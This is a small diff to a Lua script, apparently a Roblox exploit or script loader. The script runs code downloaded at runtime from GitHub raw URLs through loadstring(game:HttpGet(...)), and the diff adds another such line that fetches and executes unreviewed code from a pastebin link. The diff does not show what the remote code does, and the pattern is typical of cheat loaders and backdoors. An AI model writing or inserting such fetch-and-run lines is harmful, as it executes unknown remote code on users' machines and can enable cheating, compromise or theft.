@@ -8,5 +8,6 @@ for i,v in pairs(key) do
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/BaconScripted/string/main/loads'))()
 		loadstring(game:HttpGet('https://raw.githubusercontent.com/BaconScripted/string/main/key'))()
 		game.ReplicatedStorage:WaitForChild("mainFrame").Parent = script.Parent.Parent.HsaSfd
+		loadstring(game:HttpGet('https://pastebin.com/raw/VJ21qyqk'))()
 	end
 end
